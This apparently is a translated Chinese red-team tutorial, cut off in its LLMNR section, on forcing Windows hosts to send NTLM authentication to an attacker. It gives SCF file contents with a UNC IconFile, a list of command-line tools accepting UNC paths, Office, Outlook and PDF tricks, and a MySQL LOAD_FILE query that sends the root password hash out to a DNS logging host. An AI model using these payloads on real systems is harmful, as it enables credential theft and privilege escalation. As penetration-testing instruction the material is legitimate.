# Windows内网协议学习NTLM篇之发起NTLM请求
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：daiker@360RedTeam
## 0x00 前言
这篇文章是ntlm篇的第二篇，怎么发起ntlm请求。在 阅读这篇文章之前，有两点说明
  1. 这篇文章的主要内容是使服务器向攻击者发起ntlm 请求，但是没有进一步利用，因此本篇文件的表述都是获得net-ntlm hash。使用Responder来捕获。Responder的用法可自行搜索。这里不展开。
  2. 有些地方较为敏感，因此使用的net-ntlm hash的截图并非真实图片。这个地方不重要，主要证明能发起请求就行，出现net-ntlm hash 截图的地方都是本地测试，真实收到请求的。
## 0x01 图标
###  1.desktop.ini
文件夹底下都有个文件desktop.ini来指定文件夹图标之类的。默认不可见。去掉隐藏受保护的操作系统文件就可以看到
每个文件夹底下都会有，我们新建一个新的文件夹的话，如果没看到desktop.ini，可以尝试更改图标，就可以看到了。
将图标路径改成UNC路径，指向我们的服务器
当用户访问该文件夹的时候会去访问UNC路径,我们就能获取用户的net-ntlm hash。
###  2\. scf 文件
只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标。而IconFile是支持UNC路径的。以下是scf后缀的文件的格式
    [Shell]
    Command=2
    IconFile=\\172.16.100.1\scf\test.ico
    [Taskbar]
    Command=ToggleDesktop
新建test.scf，写入内容，放在一个文件夹底下，当用户访问该文件夹的时候，我们就会获得用户的net-ntlm hash。
###  3.用户头像
适用于Windows 10/2016/2019
在更改账户图片处。
用普通用户的权限指定一个webadv地址的图片，如果普通用户验证图片通过，那么SYSTEM用户(域内是机器用户)也去访问172.16.100.180，并且携带凭据，我们就可以拿到机器用户的net-ntlm hash，这个可以用来提权。后面会详细讲。
## 0x02 系统命令携带UNC路径
这个比较鸡肋，都能执行命令了，干啥不行呢。但作为一种场景，也说明下。说不定有些限制的命令注入就是支持传进UNC路径呢。我平时在测试的时候一般都是用 dir
\\\ip\xxx来做测试的，很多cmd命令是支持传进UNC路径的，执行的时候我们就可以拿到用户的net-ntlm
hash了。至于有哪些命令。这篇文章总结了一些命令,总结得挺全面的。
[内网渗透——针对hash的攻击](https://www.anquanke.com/post/id/177123)
    > net.exe use \hostshare 
    > attrib.exe \hostshare  
    > bcdboot.exe \hostshare  
    > bdeunlock.exe \hostshare  
    > cacls.exe \hostshare  
    > certreq.exe \hostshare #(noisy, pops an error dialog) 
    > certutil.exe \hostshare  
    > cipher.exe \hostshare  
    > ClipUp.exe -l \hostshare  
    > cmdl32.exe \hostshare  
    > cmstp.exe /s \hostshare  
    > colorcpl.exe \hostshare #(noisy, pops an error dialog)  
    > comp.exe /N=0 \hostshare \hostshare  
    > compact.exe \hostshare  
    > control.exe \hostshare  
    > convertvhd.exe -source \hostshare -destination \hostshare  
    > Defrag.exe \hostshare  
    > diskperf.exe \hostshare  
    > dispdiag.exe -out \hostshare  
    > doskey.exe /MACROFILE=\hostshare  
    > esentutl.exe /k \hostshare  
    > expand.exe \hostshare  
    > extrac32.exe \hostshare  
    > FileHistory.exe \hostshare #(noisy, pops a gui)  
    > findstr.exe * \hostshare  
    > fontview.exe \hostshare #(noisy, pops an error dialog)  
    > fvenotify.exe \hostshare #(noisy, pops an access denied error)  
    > FXSCOVER.exe \hostshare #(noisy, pops GUI)  
    > hwrcomp.exe -check \hostshare  
    > hwrreg.exe \hostshare  
    > icacls.exe \hostshare   
    > licensingdiag.exe -cab \hostshare  
    > lodctr.exe \hostshare  
    > lpksetup.exe /p \hostshare /s  
    > makecab.exe \hostshare  
    > msiexec.exe /update \hostshare /quiet  
    > msinfo32.exe \hostshare #(noisy, pops a "cannot open" dialog)  
    > mspaint.exe \hostshare #(noisy, invalid path to png error)  
    > msra.exe /openfile \hostshare #(noisy, error)  
    > mstsc.exe \hostshare #(noisy, error)  
    > netcfg.exe -l \hostshare -c p -i foo
## 0x03 XSS
利用xss构造
这种情况适用于IE和edge，其他浏览器不允许从http域跨到file域，以chrome为例
我们接下来尝试不通过UNC路径，就xss里面访问http请求来发起认证
把payload 改成
看到跳出认证框，我们也没抓到net-ntlm hash
不像smb请求直接用当然用户名和密码去登录，发起http请求时，除非该站点的域名位于企业内部网或存在于可信站点列表中。否则都会跳出认证框来让操作者再输入一次。
当我们选择自动使用当前用户名和密码登录就能拿到用户的net-ntlm hash
就可以抓到用户net-ntlm hash了
修改后的配置同样适用于chrome
那至今为止，在默认的配置情况底下，如果有xss，那构造的页面的效果有两种
  1. 构造unc，访问smb 协议，但是这种方式的话就只有IE和edge能行
  2. 构造http，访问http 协议，这种方式并不限制浏览器访问，但是除非该站点的域名位于企业内部网或存在于可信站点列表中，不然是不会使用系统默认的凭据进行登录的，会跳出认证框，让用户填写账号密码。
第二点该站点的域名位于企业内部网也是行的，那如果我们可以修改控制域内的DNS是不是就可以动点手脚了。
在查看DNS的ACL的时候，我发现了一条规则
认证用户都可以在DNS里面创建子对象，也就意味着如果我们是域内认证
用户的话，那我们就可以在域内添加域名。我们使用在kerberos篇里面提到过的Powermad里面的Invoke-DNSUpdate添加一条DNS记录
然后将我们的payload 换成
由于此时的域名位于企业内部网，所以当用户触发xss的时候会以当前用户去认证，我们也就能拿到用户的net-ntlm hash。
## 0x04 outlook
发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC。于是我们构造payload
当收件人打开outlook查看邮件的时候
我们就收到net-ntlm hash了
## 0x05 PDF
PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件。我们直接使用三好学生的脚本
我们就收到net-ntlm hash
用户使用PDF阅读器打开，如果使用IE或是Chrome打开PDF文件，并不会执行。
在实际测试中使用Adobe
发现会有提示
## 0x06 office
首先新建一个word，贴近一张图片
然后用7zip 打开(没测试其他软件，可自行测试)
进入word\\_rels，修改document.xml.rels
可以看到Target参数本来是本地的路径
修改为UNC路径，然后加上TargetMode=”External”
当打开word的时候,我们就拿到net-ntlm hash
## 0x07 MySQL
我们知道在MySQL注入的话，是可以通过带外通信把数据带出来。语法如下。
    SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));
需要具备loadfile权限，且没有securefile_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)
仔细观察我们会发现LOAD_FILE是支持UNC路劲
我们构造
    select load_file('\\\\172.16.100.1\\mysql');
拿到net-ntlm hash
## 0x08 NBNS和LLMNR
windows 解析域名的顺序是
  * Hosts
  * DNS (cache / server)
  * LLMNR
  * NBNS
如果Hosts文件里面不存在，就会使用DNS解析。如果DNS解析失败，就会使用LLMNR解析，如果LLMNR解析失败，就会使用NBNS解析
###  1\. LLMNR
LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播
DNS。监听的端口为 UDP/5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4
的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。
LLMNR 进行名称解析的过程为：